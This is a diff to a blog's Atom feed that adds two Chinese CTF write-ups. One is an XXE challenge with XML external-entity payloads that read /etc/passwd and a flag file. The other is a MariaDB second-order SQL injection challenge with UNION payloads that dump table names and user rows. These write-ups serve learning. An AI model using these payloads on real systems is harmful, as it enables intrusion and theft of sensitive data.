@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-12-30T13:47:13.319Z</updated>
+  <updated>2021-01-17T14:46:11.722Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,55 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XXE漏洞</title>
+    <link href="http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://example.com/2021/01/17/XXE%E6%BC%8F%E6%B4%9E/</id>
+    <published>2021-01-17T14:45:34.000Z</published>
+    <updated>2021-01-17T14:46:11.722Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XXE漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XXE(XML External Injection)全称为XML外部实体注入</span><br><span class="line"></span><br><span class="line">XML：设计用来传输与显示数据，其焦点是数据的内容</span><br><span class="line">HTML：设计用来显示数据，其焦点是数据的外观</span><br><span class="line"></span><br><span class="line">XML文档类型定义，即DTD。XXE漏洞所在的地方</span><br><span class="line">XXE漏洞的触发点一般发生在可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致恶意的xml文件被上传。</span><br></pre></td></tr></table></figure><h4 id="XML基本了解"><a href="#XML基本了解" class="headerlink" title="XML基本了解"></a>XML基本了解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">xml的注意要求：</span><br><span class="line">1. 所有xml元素都必须有关闭标签</span><br><span class="line">2. xml标签对大小写敏感</span><br><span class="line">3. xml必须正确嵌套</span><br><span class="line">4. xml文档必须有根元素</span><br><span class="line">5. xml的属性值必须加引号</span><br><span class="line"></span><br><span class="line">xml文档的注释：&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line">DTD(文档类型定义)：可定义合法的xml文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可以作为一个外部引用</span><br><span class="line"></span><br><span class="line">DTD的三种应用形式：</span><br><span class="line">1. 内部DTD文档  &lt;!DOCTYPE 根元素[定义内容]&gt;</span><br><span class="line">2. 外部DTD文档  &lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br><span class="line">3. 内外DTD结合  &lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</span><br><span class="line"></span><br><span class="line">DTD实体：</span><br><span class="line">用于定义引用普通文本或特殊的快捷方式变量；实体引用是对实体的以用；实体可在内部或外部进行声明。</span><br><span class="line">实体分为：一般实体和参数实体</span><br><span class="line">一般实体的声明方法：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;  引用一般实体的方法：&amp;实体名称</span><br><span class="line">* 一般实体可以在DTD，xml，声明前，实体声明内部引用</span><br><span class="line">参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;  引用参数实体的方法：%实体名称</span><br><span class="line">* 参数实体只能在DTD中引用</span><br><span class="line">内部实体：&lt;!ENTITY 实体名称 &quot;实体的值&quot; &gt; </span><br><span class="line">例：&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">   &lt;!ENTITY xxe &quot;hello&quot;&gt;]&gt; </span><br><span class="line">   &lt;foo&gt;&amp;xxe&lt;&#x2F;foo&gt;</span><br><span class="line">外部实体：用来引入外部资源，有SYSTEM 和 PUBLIC 两个关键字，表示实体来自本地计算机还是公共计算机</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">外部实体的引用可以利用如下协议：</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.txt</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file.txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.txt</span><br><span class="line"></span><br><span class="line">外部实体可以支持http,file 等协议，所以可以通过引用外部实体进行远程文件读取</span><br><span class="line">例：&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;(实体内容) &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;</span><br><span class="line">&lt;&#x2F;methodcall&gt;</span><br><span class="line">这里的xml外部实体xxe被赋予的值为file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 当解析xml文档时，&amp;xxe会被替换为file:&#x2F;&#x2F;&#x2F;ect&#x2F;passwd的内容，导致敏感信息泄露</span><br></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>此题就是一个简单的xxe攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;? xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELENENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY person SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;person;&lt;&#x2F;username&gt;</span><br><span class="line">&lt;password&gt;123&lt;&#x2F;password&gt;</span><br><span class="line">&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/01/SMizh13REwGK4NJ.png" alt="image-20210101221407136"></p><blockquote><p>flag的位置是猜出来的</p></blockquote><p><strong>XXE漏洞后期可以专门学习一下</strong></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;NCTF2019-Fake-XML-cookbook&quot;&gt;&lt;a href=&quot;#NCTF2019-Fake-XML-cookbook&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]Fake XML cookbook&quot;&gt;&lt;/a&gt;[NCTF20</summary>
+      
+    
+    
+    
+    
+    <category term="Web" scheme="http://example.com/tags/Web/"/>
+    
+    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无列名注入</title>
+    <link href="http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2021/01/17/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
+    <published>2021-01-17T14:43:37.000Z</published>
+    <updated>2021-01-17T14:44:34.899Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><blockquote><p>2021.1.16</p></blockquote><p>这题确实不会，查看大佬的wp</p><blockquote><p>需要利用MariaDB的一些特性</p></blockquote><h3 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB数据库可以利用 mysql.innodb_table_stats 查表名</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats</span><br></pre></td></tr></table></figure><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p><img src="https://i.loli.net/2021/01/16/A84hlyWBDit2JRv.png" alt="image-20210116224446299"></p><blockquote><p>正常查询时列名正常显示</p></blockquote><p><img src="https://i.loli.net/2021/01/16/y132WJfRGQIiXsY.png" alt="image-20210116224526741"></p><blockquote><p>使用联合查询，这时列名发生了变化</p></blockquote><p><strong>这里可以利用这个方式在不知道列名的情况下查询内容</strong></p><p><img src="https://i.loli.net/2021/01/16/YrJjZqGx57L2OwT.png" alt="image-20210116224644826"></p><blockquote><p>使用反引号和别名，直接获取到了单列的值</p></blockquote><p>反引号禁用时</p><p><img src="https://i.loli.net/2021/01/17/WZLItMnwHgpuEea.png" alt="image-20210116224745966"></p><blockquote><p>这里直接利用了取别名的方式，没有使用反引号</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">相关学习文章</a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><blockquote><p>二次注入</p></blockquote><p>直接将广告名写为<code>1’</code>,保存后查看</p><p><img src="https://i.loli.net/2021/01/16/X7spl92mhPaSAVj.png" alt="image-20210116231225422"></p><blockquote><p>这题需要在申请广告的广告名处注入，之前搞错了…… 拿着id怼了半天……</p></blockquote><p><img src="https://i.loli.net/2021/01/16/yTW5QDNOxFw6iA3.png" alt="image-20210116233000715"></p><p><img src="https://i.loli.net/2021/01/16/qCaRDUL7fNQ89PT.png" alt="image-20210116232950459"></p><blockquote><p>这里报错字段长度不对劲</p></blockquote><p><img src="https://i.loli.net/2021/01/16/wNePUZ6cGOmBEAT.png" alt="image-20210116233057745"></p><p><img src="https://i.loli.net/2021/01/16/AS4xrPyTJiYIgh5.png" alt="image-20210116233047870"></p><blockquote><p>多次尝试发现字段长度为22并且回显的地方为2，3两处</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查库：-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/16/eaVDdcNtIFxEb4r.png" alt="image-20210116233316001"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/cjwNtdGaRMoLy1C.png" alt="image-20210117000629293"></p><blockquote><p>此题主要掌握无列名查询与查询表名的新方法</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web1&quot;&gt;&lt;/a&gt;[SWPU2019]Web1&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;2021.1.16&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="Web" scheme="http://example.com/tags/Web/"/>
+    
+    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
+    
+  </entry>
   
   <entry>
     <title>CUMT2020-岁末赛</title>
